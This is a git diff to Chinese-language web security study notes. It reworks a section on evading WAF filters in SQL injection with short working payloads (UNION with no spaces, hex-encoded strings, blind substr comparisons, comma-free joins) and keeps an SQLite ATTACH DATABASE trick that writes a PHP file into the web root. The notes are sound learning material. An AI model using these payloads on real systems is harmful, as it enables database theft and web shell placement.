@@ -233,6 +233,10 @@ UPDATE users SET pwd='pswd' WHERE name='admin' -- '
 
 - **更改文件名**：把文件名改成难以猜测的形式，如随机字符串，后缀也改成合法后缀，避免攻击者访问该文件
 
+### 绕过
+
+感觉文件上传的绕过技术大部分都不实用，因此暂时放在CTF笔记中
+
 ### 图片木马
 
 包含恶意代码的图片俗称图片马。恶意代码插入于图片文件结束标记之后，或EXIF元数据，不影响图片显示；但将图片马作为代码执行时，比如用文件包含漏洞，解释器解析执行`<?php ?>`或`<% %>`中的代码。和图种的原理类似
@@ -379,40 +383,30 @@ XML外部实体（XML eXternal Entity）可以引用外部数据，例如文件�
 
 参考资料：[SQL注入相关知识整理](https://www.geekby.site/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/)、[SQL注入漏洞基本原理](https://wiki.wgpsec.org/knowledge/web/sql_injection.html)、[数据库检测](https://websec.readthedocs.io/zh/latest/vuln/sql/dbident.html)、[SQL注入绕过速查表](https://github.com/BaizeSec/bylibrary/blob/main/docs/%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8.md)、[SQL注入参考文章](https://websec.readthedocs.io/zh/latest/vuln/sql/ref.html#tricks)
 
-### 绕过
+### 绕过技巧
 
 WAF等防护系统会采用特征识别危险请求。防护系统不能影响正常业务，识别的关键字肯定是有限的
 
-#### 关键字
-
 ```sql
--- and, or：用&&和||代替
-```
-
-#### 符号
-
-```sql
--- 空格：用行内注释、括号、浮点数、反引号括起表名列名等代替
+-- 过滤空格：用行内注释、括号、浮点数、反引号括起表名列名等代替
 SELECT name FROM users WHERE id=1e0union(select`pw`from`users`where(id=1));
 
--- 引号：使用16进制数
--- ord, ascii - 字符转编码；char - 编码转字符
--- hex, unhex - 转16进制
-SELECT * FROM users WHERE id=-1||name=0x61646d696e;
+-- 过滤引号：使用编码(ord, ascii, char, hex, unhex等)或者十六进制数
+SELECT * FROM users WHERE id=0 or name=0x61646d696e;     -- 'admin' = 0x6169...
+SELECT * FROM users WHERE id=0 or name like char(24869); -- 'a%' = 24869，注意int超出32位会截断
 
--- 函数式编程绕过各种运算符。下面例子判断database()第一个字符码值是否大于64
+-- 过滤运算符：函数式编程。下面例子判断database()第一个字符码值是否大于64
 SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
 
--- 注释：闭合引号、括号
+-- 过滤注释：闭合引号、括号
 SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
 
--- Join查询绕过逗号
+-- 过滤逗号：Join查询；部分函数内逗号可用关键字代替
 SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (select 2)B);
+SELECT substr('abc' from 1 for 1), trim(leading 'a' from 'abc');
 ```
 
-编码
-
-混用数字和字符串时，数据库会做自动类型转换。`10='10a', 'a'=0x31`；SQL的16进制数在比较时可以自动转换为字符串
+### 注入方式
 
 #### 盲注
 
@@ -420,9 +414,6 @@ SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (se
 SELECT substr('a', 1, 1);
 -- 同义函数：substring, mid, left, right
 -- 类似效果：regexp, rlike, trim, insert, like
-
--- 逗号过滤
-SELECT substr('abc' from 1 for 1), trim(leading 'a' from 'abc');
 
 -- 比较
 SELECT 1 between 1 and 1;
@@ -511,9 +502,8 @@ SELECT pg_sleep(5);
 
 ```sql
 SELECT sqlite_version()
+SELECT `name`, `tbl_name`, `sql` FROM sqlite_master WHERE type='table'; -- 表名和建表语句
 ```
-
-SQLite的元数据存在`sqlite_master`表中，此表的`type`列是`table`或`index`，`name`和`tbl_name`列是表名，`sql`列是建表语句
 
 下列语句可以创建文件，并向其中写入数据
 
@@ -522,8 +512,6 @@ ATTACH DATABASE '/var/www/html/webshell.php' AS ws;
 CREATE TABLE ws.ws_table (content text);
 INSERT INTO ws.ws_table (content) VALUES ('<?php phpinfo(); ?>');
 ```
-
-
 
 ### 其他技巧
 
@@ -577,7 +565,7 @@ SELECT a FROM (
 
 ## 文件上传
 
-
+暂时记在ctf笔记，验证了有实用性的再移过来此处
 
 ## XSS
 
